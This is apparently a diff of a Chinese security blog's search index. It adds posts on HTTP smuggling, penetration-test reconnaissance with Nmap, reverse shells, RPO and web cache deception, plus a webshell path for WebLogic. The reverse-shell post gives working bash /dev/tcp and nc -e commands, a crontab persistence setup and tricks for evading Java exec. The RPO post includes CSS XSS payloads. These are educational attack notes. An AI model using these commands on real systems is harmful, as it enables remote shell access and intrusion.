@@ -1386,7 +1386,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3&#x2F;cmprq0&#x2F;war&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;ws_utc&#x2F;config&#x2F;keystore&#x2F;timestamp_filename.jsp</span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;bea_wls_internal&#x2F;upload&#x2F;RS_Upload_2020-06-16_12-20-21_667&#x2F;import_file_name_cmd.jsp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;bea_wls_internal&#x2F;shell.jsp</span><br><span class="line"></span><br><span class="line">&#x2F;bea_wls_internal&#x2F;upload&#x2F;RS_Upload_2020-06-16_12-20-21_667&#x2F;import_file_name_cmd.jsp</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_deployment_internal&#x2F;gyuitk&#x2F;war</span><br><span class="line"></span><br><span class="line">&#x2F;bea_wls_deployment_internal&#x2F;cmd.jsp</span><br></pre></td></tr></table></figure>
 
@@ -2492,6 +2492,376 @@
       </categories>
       <tags>
         <tag>FastJson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP Smuggling攻击</title>
+    <url>/2020/07/20/http-smuggling/</url>
+    <content><![CDATA[<p>在2019年的BlackHat USA 2019上，James Kettle在其议题”HTTP Desync Attacks: Smashing into the Cell Next Door”中，因此写下本文对HTTP Smuggling这一攻击技术进行一个梳理。</p>
+<a id="more"></a>
+
+<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>HTTP走私这一攻击方式很特殊，它基于不同服务器对RFC标准实现的差异，使得对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，因此产生了安全风险。  </p>
+<p>HTTP 1.1协议的新特性: <code>Keep-Alive&amp;Pipeline</code>，实现方式即在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>。这使得TCP连接可以重用，减少服务器的开销，节约资源，加快访问速度。由此而生的CDN加速服务，这种具有CDN式的结构给HTTP Smuggling攻击提供了温床。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试之信息收集</title>
+    <url>/2020/07/20/information-collection/</url>
+    <content><![CDATA[<p>在对一个目标进行渗透测试前，最重要的是对其进行信息收集，信息收集的完成度某种程度上决定了后续渗透的成功与否。这篇文章主要是总结一下自己在信息收集过程中用到的一些工具和思路，给自己做个笔记。</p>
+<a id="more"></a>
+
+<h1 id="信息收集的流程"><a href="#信息收集的流程" class="headerlink" title="信息收集的流程"></a>信息收集的流程</h1><p>当我们拿到一个目标时，一般是域名信息，根据这个目标，信息收集会做以下的事情，这个流程只是我自己所理解的:</p>
+<ul>
+<li>子域名收集。</li>
+<li>IP信息收集。</li>
+<li>服务/端口收集。</li>
+<li>端口的指纹收集（包括防火墙(waf)识别）</li>
+<li>网站目录结构收集。(敏感信息泄露、路由扫描)</li>
+<li>Github源代码收集。</li>
+<li>漏洞扫描收集(可选)。</li>
+</ul>
+<h1 id="1-子域名收集"><a href="#1-子域名收集" class="headerlink" title="1.子域名收集"></a>1.子域名收集</h1><p>针对于一个域名子域名有哪些收集方式呢？先介绍子域名收集工具，一般都会使用子域名工具来收集。</p>
+<ul>
+<li><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a></li>
+</ul>
+<h2 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h2><p><img src="1.png" alt=""><br>从它的文档中可以看出它涵盖了很多收集子域名的方式。让我们来简单了解各个模块收集子域名的原理。</p>
+<h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><p>证书透明度(Certificate Transparency, CT)是一个试验性的IETF开源标准和开源框架，证书颁发机构CA必须将每个SSL或TLS证书发布到公共日志中。SSL和TLS证书通常包含域名、子域名和电子邮件地址。如下入所示</p>
+<p><img src="2.png" alt=""></p>
+<blockquote>
+<p>证书透明CT日志中找到的域/子域可能已经不存在。</p>
+</blockquote>
+<ul>
+<li>分享几个在线证书透明日志搜索:<ul>
+<li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li>
+<li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li>
+<li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li>
+<li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>搜索引擎主要是利用各大搜索引擎通过google hacking的手段去收集子域名。<code>site:domain</code></p>
+<p><img src="3.png" alt=""></p>
+<ul>
+<li>Bing搜索引擎</li>
+<li>Google搜索引擎</li>
+<li>Baidu搜索引擎</li>
+</ul>
+<h3 id="字典爆破"><a href="#字典爆破" class="headerlink" title="字典爆破"></a>字典爆破</h3><p>准备一个常用子域名字典，然后模拟请求dns服务器，观察子域名是否有成功被解析。它的一个问题是若域名设置了泛解析，那么几乎所有的子域名都能够被解析，造成很多无用子域名数据。</p>
+<ul>
+<li>DNSPod<a href="https://github.com/DNSPod/oh-my-free-data/blob/master/src/dnspod-top2000-sub-domains.txt" target="_blank" rel="noopener">dnspod-top2000-sub-domains.txt</a></li>
+</ul>
+<blockquote>
+<p>解决方案是将爆破后的子域名+IP结果一起存入结果，检查同一IP对应的子域名，若数量过多(设置阈值)，则判定为无用子域名。构造随机的特殊字符串，若也能解析成功，则说明使用了泛解析。</p>
+</blockquote>
+<h3 id="DNS数据集"><a href="#DNS数据集" class="headerlink" title="DNS数据集"></a>DNS数据集</h3><p>又称DNS聚合器，聚合了大量DNS数据集。可通过它们来搜索给定域的子域。</p>
+<ul>
+<li>VirusTotal<ul>
+<li>运行自己的被动DNS复制服务，通过存储用户提交的URL解析结果来建立的<a href="https://www.virustotal.com/gui/home" target="_blank" rel="noopener">https://www.virustotal.com/gui/home</a>。<br><img src="4.png" alt=""></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>DNSdumpster<ul>
+<li>可以挖掘出指定域潜藏的大量子域。<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a><br><img src="5.png" alt="">    </li>
+</ul>
+</li>
+</ul>
+<h3 id="常规检查"><a href="#常规检查" class="headerlink" title="常规检查"></a>常规检查</h3><p>常规检查主要是通过http头、域传送漏洞等，主要包括以下内容:</p>
+<ul>
+<li>HTTP头。(CSP)    </li>
+<li>文件泄露。(robots、sitemap、crossdomain.xml)</li>
+<li>域传送漏洞。</li>
+</ul>
+<h3 id="空间搜索引擎"><a href="#空间搜索引擎" class="headerlink" title="空间搜索引擎"></a>空间搜索引擎</h3><p>利用网上一些网络空间搜索引擎来收集子域名。</p>
+<ul>
+<li><a href="http://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a></li>
+<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></li>
+<li><a href="https://censys.io/" target="_blank" rel="noopener">censys</a></li>
+<li><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a></li>
+<li><a href="https://community.riskiq.com/login" target="_blank" rel="noopener">RiskIQ</a></li>
+</ul>
+<h1 id="2-IP信息收集"><a href="#2-IP信息收集" class="headerlink" title="2.IP信息收集"></a>2.IP信息收集</h1><p>IP信息收集这块，我把它主要分为2部分。一部分是直接的IP搜集和真实IP的搜集，还有一部分是针对于C段IP信息的收集。</p>
+<h2 id="直接的IP收集"><a href="#直接的IP收集" class="headerlink" title="直接的IP收集"></a>直接的IP收集</h2><p>直接的IP收集，在前面的子域名收集中，也会连带着将这部分内容输出。在目标存在CDN的情况下，这种方式搜索到的IP大概率是CDN的IP而不是真实IP，这对于后续利用来说十分有限。但还是介绍几个寻找IP的工具。</p>
+<ul>
+<li>nslookup<br><img src="6.png" alt=""></li>
+<li>dig<br><img src="7.png" alt=""></li>
+</ul>
+<h2 id="真实IP收集"><a href="#真实IP收集" class="headerlink" title="真实IP收集"></a>真实IP收集</h2><p>为什么要真实的IP，只有拿到了真实的IP，才能进行下一步对真实服务器的端口开放情况进行扫描。如何获取真实的IP呢？</p>
+<h3 id="利用子域名"><a href="#利用子域名" class="headerlink" title="利用子域名"></a>利用子域名</h3><p>一般来说对主营业务，访问压力大的域名才会使用CDN，而子域名有可能部署在同一台服务器或者同一个C段，就有可能从中找到真实的IP地址。</p>
+<h3 id="历史DNS记录"><a href="#历史DNS记录" class="headerlink" title="历史DNS记录"></a>历史DNS记录</h3><p>通过平台以前收集到的ip与域名绑定的历史记录进行寻找，可能存在以前并未使用CDN的情况。介绍几个历史DNS查询平台。</p>
+<ul>
+<li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">dnsdb</a></li>
+<li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">threatbook</a></li>
+</ul>
+<h3 id="邮件-RSS订阅"><a href="#邮件-RSS订阅" class="headerlink" title="邮件/RSS订阅"></a>邮件/RSS订阅</h3><p>通过邮件订阅/RSS订阅让目标站主动联系，查看其邮箱服务器的IP，有可能与web服务在一个服务器上。</p>
+<h3 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h3><p>国内的CDN往往只对国内的用户，通过国外访问，可能会得到真实的ip地址。介绍一个国外代理网站。</p>
+<ul>
+<li><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">ping</a></li>
+</ul>
+<h3 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h3><p>利用censys搜索网站的ssl证书及hash，然后在<a href="https://crt.sh" target="_blank" rel="noopener">crt</a>上查找目标网站SSL证书的hash，然后再用censys搜索该hash即可得到真实的ip地址。</p>
+<h3 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h3><p>利用phpinfo、SSRF、XSS等漏洞让目标主动联系。</p>
+<h2 id="C段IP信息收集"><a href="#C段IP信息收集" class="headerlink" title="C段IP信息收集"></a>C段IP信息收集</h2><p>这个在实际的渗透测试可能并不是那么必须的，对目标拿到的IP信息比较少，且在已有的目标中没有什么漏洞时，将思路转为子网中的其他服务器。收集的方式很多，fofa等工具，也可以使用nmap这一强大的渗透利器。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -O -P0 -oG - 192.168.231.0&#x2F;24 | awk &#39;&#x2F;open&#x2F;&#123;print $2&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-服务收集"><a href="#3-服务收集" class="headerlink" title="3.服务收集"></a>3.服务收集</h1><p>服务收集的目的主要是为了查看目标开放的端口服务，然后根据各种端口服务的一些指纹信息再进行进一步的利用。</p>
+<p>一般来说，都会使用网络空间搜索引擎(如fofa、shodan之类的)进行查询直接获得结果。本着学习的目的，在这里介绍一下<a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">Nmap</a>这个强大的工具。</p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap有很多种扫描端口的方式，根据不同的场景和限制选择不同的方式。</p>
+<p>最简单的方式是不加任何参数。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.23</span><br><span class="line">nmap 192.168.1.1&#x2F;24  &#x2F;&#x2F;扫描整个子网的端口</span><br><span class="line">nmap 192.168.1.23 192.168.34.243</span><br><span class="line">nmap 192.168.1.1&#x2F;24 -exclude 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p>加上<code>-p</code>参数，对指定端口进行扫描。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80 192.168.1.23</span><br><span class="line">nmap -p 80,22,21 192.168.1.23</span><br><span class="line">nmap -p 1-65536 192.168.1.23</span><br></pre></td></tr></table></figure>
+
+<p>加入<code>-sV</code>参数，在进行端口扫描时检测服务端软件的版本信息(即指纹信息)。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.23 -p 80</span><br></pre></td></tr></table></figure>
+
+<p>加入<code>-O</code>参数，端口扫描时识别目标主机的操作系统。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.1.23</span><br></pre></td></tr></table></figure>
+
+<p>加入<code>-Pn</code>参数，当目标主机屏蔽了ping请求，Nmap会认为该主机没有开机，选择禁用Nmap的主机检测功能，Nmap就会进行全套的检测工作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn 192.168.1.23</span><br></pre></td></tr></table></figure>
+
+<p>加入<code>-A</code>参数，表示综合扫描，包括OS识别、版本探测和traceroute综合扫描。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.1.23</span><br></pre></td></tr></table></figure>
+
+<p>加入<code>-sP</code>参数，代表Ping扫描。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.1.23-100</span><br></pre></td></tr></table></figure>
+
+<p>加入<code>-sC</code>参数，根据端口识别的服务，调用默认脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC 192.168.1.23 -p 8080</span><br></pre></td></tr></table></figure>
+
+<h3 id="TCP扫描选项"><a href="#TCP扫描选项" class="headerlink" title="TCP扫描选项"></a>TCP扫描选项</h3><ul>
+<li>-sT (TCP连接扫描)</li>
+<li>-sS (SYN扫描) 隐蔽</li>
+<li>-sN (NULL扫描)</li>
+<li>-sF (FIN扫描) 隐蔽、漏扫</li>
+<li>-sX (XMAS扫描)</li>
+<li>-sW (TCP窗口扫描)</li>
+<li>-sl (指定僵尸主机发送扫描数据包)</li>
+</ul>
+<h3 id="UDP扫描选项"><a href="#UDP扫描选项" class="headerlink" title="UDP扫描选项"></a>UDP扫描选项</h3><ul>
+<li>-sU</li>
+</ul>
+<h3 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h3><p>在它的官网中按照类别将脚本进行分类。如下图所示:<br><img src="8.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;address-info www.baidu.com</span><br></pre></td></tr></table></figure>
+
+
+<p>除了端口扫描外，还具备以下其他功能:</p>
+<ul>
+<li>主机探测</li>
+<li>服务/版本探测</li>
+<li>操作系统检测</li>
+<li>网络路由跟踪</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -traceroute www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-端口指纹收集"><a href="#4-端口指纹收集" class="headerlink" title="4.端口指纹收集"></a>4.端口指纹收集</h1><p>这一阶段的任务主要是根据上述的扫描结果，对开放端口的服务、目标主机以及防火墙等信息进行收集识别，便于后续的漏洞利用。在这里分为应用服务指纹识别和防火墙(WAF)指纹识别。</p>
+<h2 id="应用指纹收集"><a href="#应用指纹收集" class="headerlink" title="应用指纹收集"></a>应用指纹收集</h2><p>应用指纹信息在使用端口扫描时，能够收集到一些服务的信息。那么这些服务尤其是网站服务是需要进一步地进行CMS指纹识别等应用信息的收集。按照惯例推荐CMS指纹识别工具。</p>
+<ul>
+<li><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">whatweb</a><br><img src="9.png" alt=""></p>
+</li>
+<li><p><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener"></a><br>需要登录后查看。</p>
+</li>
+</ul>
+<h2 id="WAF指纹收集"><a href="#WAF指纹收集" class="headerlink" title="WAF指纹收集"></a>WAF指纹收集</h2><p>WAF指纹收集的收集并不容易，根据响应包的信息，或者是构造特殊的请求，然后查看响应结果。由于本人目前对于企业的一些WAF不太熟悉，这一部分暂缓。</p>
+<h1 id="5-网站目录收集"><a href="#5-网站目录收集" class="headerlink" title="5.网站目录收集"></a>5.网站目录收集</h1><p>这一步主要是针对于目标是网站应用时需要做的一步。通过目录信息收集，有可能会找出泄漏的网站源码、配置文件等，但更多的是找出了更多的API接口。在这里同样介绍工具，原理很简单就是根据字典来不断拼接路径，发送请求，然后判断该路径是否存在。</p>
+<ul>
+<li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a></li>
+</ul>
+<blockquote>
+<p>dirsearch是一个包含丰富字典的目录扫描工具，它的字典大约有6000多个，在限制扫描的网站目标中要慎用。同时它也提供使用者选择自己字典的功能。</p>
+</blockquote>
+<h1 id="6-Github源码收集"><a href="#6-Github源码收集" class="headerlink" title="6.Github源码收集"></a>6.Github源码收集</h1><p>在收集了网站的一些特征后，比如用到了一个名为xxx.js的文件，可以利用该特征去github上搜索，有可能搜到开发者上传的源码。</p>
+<h1 id="7-漏洞扫描-可选"><a href="#7-漏洞扫描-可选" class="headerlink" title="7.漏洞扫描(可选)"></a>7.漏洞扫描(可选)</h1><p>在真实的渗透环境中，大部分的时候都是手工寻找漏洞，在目标网站对于扫描器不敏感的情况下，也可以使用诸如Nessus、AWVS的工具进行一个漏扫。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://anyeduke.gitbooks.io/the-art-of-subdomain-enumeration_zh_cn/content/0x01bei-dong-zi-yu-ming-mei-ju/3shi-yong-dns-ju-he.html" target="_blank" rel="noopener">The art of subdomain enumeration</a></li>
+<li><a href="https://xz.aliyun.com/t/6617" target="_blank" rel="noopener">深入了解子域名挖掘tricks</a></li>
+<li><a href="https://crayon-xin.github.io/2018/08/12/nmap%E8%B6%85%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" target="_blank" rel="noopener">nmap超详细使用指南</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>反弹shell的那些事儿</title>
+    <url>/2020/07/08/reverse-shell/</url>
+    <content><![CDATA[<p>最近在多种环境下进行反弹shell，在不同的环境下，它有着不同的限制，需要进行相应的变化。本文主要是记录这些问题，以便后续查看。</p>
+<a id="more"></a>
+
+<h1 id="反弹shell常用命令"><a href="#反弹shell常用命令" class="headerlink" title="反弹shell常用命令"></a>反弹shell常用命令</h1><ul>
+<li>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</li>
+<li>nc -e /bin/bash ip port</li>
+</ul>
+<h1 id="不同场景"><a href="#不同场景" class="headerlink" title="不同场景"></a>不同场景</h1><h2 id="Ubuntu-crontab反弹shell"><a href="#Ubuntu-crontab反弹shell" class="headerlink" title="Ubuntu crontab反弹shell"></a>Ubuntu crontab反弹shell</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>Linux下的cron中command执行的shell环境是<font color=#008000>/bin/sh</font>。/bin/sh是一个软连接，而它指向的环境是<font color=#008000>dash</font>。</p>
+<p><img src="1.png" alt=""></p>
+<p>虽然Centos下cron执行的shell环境也是<font color=#008000>/bin/sh</font>。但其指向了<font color=#008000>bash</font>。因此可以直接成功。</p>
+<p><img src="2.png" alt=""></p>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
+<li>修改ubuntu中的/bin/sh的指向。<code>ln -s -f bash /bin/sh</code></li>
+<li>避免直接在cron文件中使用bash这个shell，另建一个文件。<ul>
+<li><code>#!/bin/bash
+/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code> -&gt; /tmp/test.sh</li>
+<li><code>chmod +x /tmp/test.sh</code></li>
+<li><code>* * * * * /tmp/test.sh</code></li>
+</ul>
+</li>
+<li>在sh的环境下执行bash -c<ul>
+<li><code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;</code></li>
+</ul>
+</li>
+</ol>
+<h2 id="Java上下文反弹shell"><a href="#Java上下文反弹shell" class="headerlink" title="Java上下文反弹shell"></a>Java上下文反弹shell</h2><p>Java下命令执行的方式有: </p>
+<ul>
+<li>ProcessBuilder</li>
+<li>Runtime</li>
+<li>ProcessImpl</li>
+</ul>
+<p>其中Runtime.getRuntime().exex()的底层实际上也是ProcessBuilder。<br>Java在命令执行时，带有|,&lt;,&gt;等符号的命令没办法正常执行。</p>
+<h3 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h3><p>当传入的command是字符串时，会经过StringTokenizer的分割即以空格进行分割，在这里分割的结果会使得命令变得非预期。分割结束后，Java的JDK沙盒机制会对分割后的第一个字符串进行checkExec，以确定是以什么命令环境启动，然后仅能执行单条命令，拼接不了相关参数。  </p>
+<p>当传入的command是字符串数组时，不会经过分割，完整地保存了想要的语义。</p>
+<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><ul>
+<li>传入的字符串数组的命令。</li>
+<li>linux下可以用bash的base64编码来解决特殊字符的问题。<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a></li>
+<li>linux下使用${IFS}绕过分隔符。<code>/bin/bash -c bash${IFS}-i${IFS}&gt;&amp;/dev/tcp/ip/port&lt;&amp;1</code>。</li>
+<li>利用$@。<code>/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</code>。</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">解决ubuntu crontab反弹shell失败的问题</a>    </li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652471913&idx=1&sn=f8c29997df75dbe910be431e5beb2faa&scene=21#wechat_redirect" target="_blank" rel="noopener">Java下奇怪的命令执行</a></li>
+<li><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>RPO攻击技术研究</title>
+    <url>/2020/07/18/rpo/</url>
+    <content><![CDATA[<p>RPO(Relative Path Overwrite)是一种<font color=#008000>基于服务器的web缓存技术和配置差异，利用服务器与浏览器对URL解析的差异，将页面中使用相对路径引入的静态资源文件解析成其他资源文件/可控内容的页面</font>，从而使用可控的方式(js)来处理服务器的响应内容，导致XSS、信息泄漏的产生的新型攻击技术。此外，服务器与浏览器对URL解析的差异也是开放重定向漏洞的一个成因。</p>
+<a id="more"></a>
+
+
+<h1 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h1><ul>
+<li>服务器与浏览器对URL解析的差异</li>
+<li>存在相对路径的js或者css的引用</li>
+</ul>
+<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><p>首先需要知道的一点是浏览器对%2f是不会解析的。然后就是服务端的解析情况。</p>
+<ul>
+<li>Apache在开启<code>AllowEncodedSlashes</code>这个选项时，会对URL中的%2f进行解码。(默认不开启)</li>
+<li>nginx默认会对URL中的%2f进行解码。  </li>
+</ul>
+<p>url会存在以下几种模式。</p>
+<h3 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h3><p><code>http://localhost/index.php?m=Index&amp;a=test</code></p>
+<p>那么对于传入的url为<code>/A/B/..%2f.index.php</code>来说，服务器端会定位到<code>/A/index.php</code>，而浏览器获得的相对路径为<code>/A/B/</code>。因此，当在<code>/A/index.php</code>页面中存在相对资源的引用时，本应该引入的/A/xxx.js，却引入了/A/B/xxx.js。当/A/B/目录下的资源可控时，就能造成xss等漏洞。</p>
+<blockquote>
+<p>这样的攻击方式利用条件比较严苛，需要对静态资源可控。</p>
+</blockquote>
+<h3 id="pathinfo模式"><a href="#pathinfo模式" class="headerlink" title="pathinfo模式"></a>pathinfo模式</h3><p>PHP的path_info模式，如下面所示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;模块&#x2F;方法</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;Index&#x2F;test</span><br></pre></td></tr></table></figure>
+<p>这样的方式，存在的安全问题就是后端服务器会将拼接的不存在的路径当作一个参数，实际上会返回错误路径前正确路径的内容。</p>
+<h2 id="url-rewrite模式"><a href="#url-rewrite模式" class="headerlink" title="url_rewrite模式"></a>url_rewrite模式</h2><p>当服务器端进行了路由美化(使用了url_rewrite的php框架，python web框架)，比如REST风格的API，<code>http://ip:port/rpo/user/id/1</code>。其中1为id参数的值，该请求的接口实际为<code>/rpo/user/</code>。那么当请求为<code>/rpo/user/id/1/test</code>，后端会识别出&lt;id,1&gt;这一对参数值，然后的识别为&lt;test,’’&gt;，因此会返回&lt;id,1&gt;的内容。但是浏览器客户端会认为id是目录，从而加载了<code>/rpo/user/id/</code>路径下的静态资源。</p>
+<blockquote>
+<p>浏览器在解析CSS样式时，会忽略非法的部分，直到找到正确的开始然后进行解析一直到结束。可以输入payload为CSS的XSS向量。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#header &#123;background:url(javascript:alert(‘1’));&#125;</span><br><span class="line">&#123;&#125;*&#123;x:expression(alert(1))&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><ul>
+<li>参考2018年强网杯。<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1></li>
+<li><a href="https://www.smi1e.top/%E6%B5%85%E8%B0%88rpo%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">浅谈RPO攻击</a></li>
+<li><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="noopener">【技术分析】RPO攻击技术浅析</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>Web缓存欺骗(WCD)与Web缓存投毒(WCP)</title>
+    <url>/2020/07/18/wcd/</url>
+    <content><![CDATA[<p>Web缓存欺骗和Web缓存投毒是一种新的Web攻击向量，它使得多种Web缓存技术(如CDN、负载均衡器、反向代理)和框架都面临风险。两者都利用了web缓存，但在利用方式上有着不同。</p>
+<a id="more"></a>
+
+<h1 id="Web缓存欺骗"><a href="#Web缓存欺骗" class="headerlink" title="Web缓存欺骗"></a>Web缓存欺骗</h1><p>在存在web缓存的情况下，通过”欺骗”用户访问一个不存在的静态页面，从而使敏感页面保存在缓存中，从而当攻击者再次访问此不存在的静态页面，就能从缓存中获取到用户的敏感信息。</p>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ul>
+<li>web缓存功能设置为通过url的扩展名来判断是否缓存文件，且忽略任何缓存头(服务器端返回的响应中没有no-store指令或可被绕过)。</li>
+<li>使用rewrite、pathinfo类似的模式，当访问/xxx.php/non-existen.css时，返回/xxx.php的内容。</li>
+<li>“欺骗”用户点击时，用户需要认证状态。</li>
+</ul>
+<h2 id="web缓存实例"><a href="#web缓存实例" class="headerlink" title="web缓存实例"></a>web缓存实例</h2><h3 id="1-Cloudflare"><a href="#1-Cloudflare" class="headerlink" title="1. Cloudflare"></a>1. Cloudflare</h3><p>当来自web服务器的文件到达Cloudflare时。文件会进行两阶段处理。</p>
+<ul>
+<li>检查目标站点、文件来源目录是否设置了缓存功能。</li>
+<li>检查是否以特定的静态扩展名结尾。<code>class, css, jar, js, jpg, jpeg, gif, ico, png, bmp, pict, csv, doc, docx, xls, xlsx, ps, pdf, pls, ppt, pptx, tif, tiff, ttf, otf, webp, woff, woff2, svg, svgz, eot, eps, ejs, swf, torrent, midi, mid</code>。</li>
+<li>检查HTTP缓存头部是否存在。实际中cloudflare存在”边缘缓存过期TTL”的功能，这个功能可以用来覆盖任何已有的头部信息。当该功能</li>
+</ul>
+<h3 id="2-NGINX"><a href="#2-NGINX" class="headerlink" title="2. NGINX"></a>2. NGINX</h3><p>作为负载均衡服务器，NGINX也可以提供缓存功能，来缓存从web服务器返回的页面。通过NGINX配置文件设置缓存规则，若配置的忽略头部中包含Cache-Control，则会忽略文件的缓存头部。</p>
+<h3 id="3-IIS-ARR"><a href="#3-IIS-ARR" class="headerlink" title="3. IIS ARR"></a>3. IIS ARR</h3><p>ARR(Application Request Routing,应用程序请求路由)模块可以为IIS带来负载均衡功能。IIS ARR中存在可以忽略文件的缓存头部的选项，导致即使服务器设置了no-store也无济于事。</p>
